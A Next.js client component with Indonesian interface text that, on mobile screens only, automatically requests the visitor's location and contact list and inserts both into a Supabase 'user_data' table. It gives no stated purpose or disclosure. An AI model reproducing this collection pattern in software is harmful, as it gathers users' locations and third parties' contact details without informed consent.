/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useEffect, useState } from "react";
import { getLocation } from "../utils/location";
import { ContactData, UserData } from "@/types";
import { getContacts } from "@/utils/contact";
import { supabase } from "@/lib/supabse";
interface PermissionHandlerProps {
	onPermissionsGranted: (data: UserData) => void;
}

export default function PermissionHandler({ onPermissionsGranted }: PermissionHandlerProps) {
	const [status, setStatus] = useState<"meminta-izin" | "izin-diberikan" | "gagal" | "hanya-mobile">("meminta-izin");
	const [error, setError] = useState<string | null>(null);

	useEffect(() => {
		const requestPermissions = async () => {
			try {
				// Minta izin lokasi
				const location = await getLocation();

				// Minta izin kontak (hanya di perangkat mobile)
				let contacts: ContactData[] = [];
				if ("contacts" in navigator) {
					contacts = await getContacts();
				}

				// Simpan data ke Supabase
				await supabase.from("user_data").insert([
					{
						location,
						contacts,
						collected_at: new Date().toISOString(),
					},
				]);

				setStatus("izin-diberikan");
				onPermissionsGranted({ location, contacts });
			} catch (err: any) {
				setStatus("gagal");
				setError(err.message);
				console.error("Error:", err);
			}
		};

		// Mulai proses hanya jika di perangkat mobile
		if (typeof window !== "undefined" && window.innerWidth < 768) {
			requestPermissions();
		} else {
			setStatus("hanya-mobile");
		}
	}, [onPermissionsGranted]);

	return (
		<div className="p-4">
			{status === "meminta-izin" && <p className="text-lg">Meminta izin akses lokasi dan kontak...</p>}

			{status === "izin-diberikan" && <p className="text-green-600">Izin diberikan! Silakan lanjutkan.</p>}

			{status === "gagal" && (
				<div className="text-red-600">
					<p>Gagal mendapatkan izin: {error}</p>
					<button onClick={() => window.location.reload()} className="mt-2 px-4 py-2 bg-blue-500 text-white rounded">
						Coba Lagi
					</button>
				</div>
			)}

			{status === "hanya-mobile" && <p className="text-yellow-600">Fitur ini hanya tersedia di perangkat mobile. Silakan buka di smartphone Anda.</p>}
		</div>
	);
}
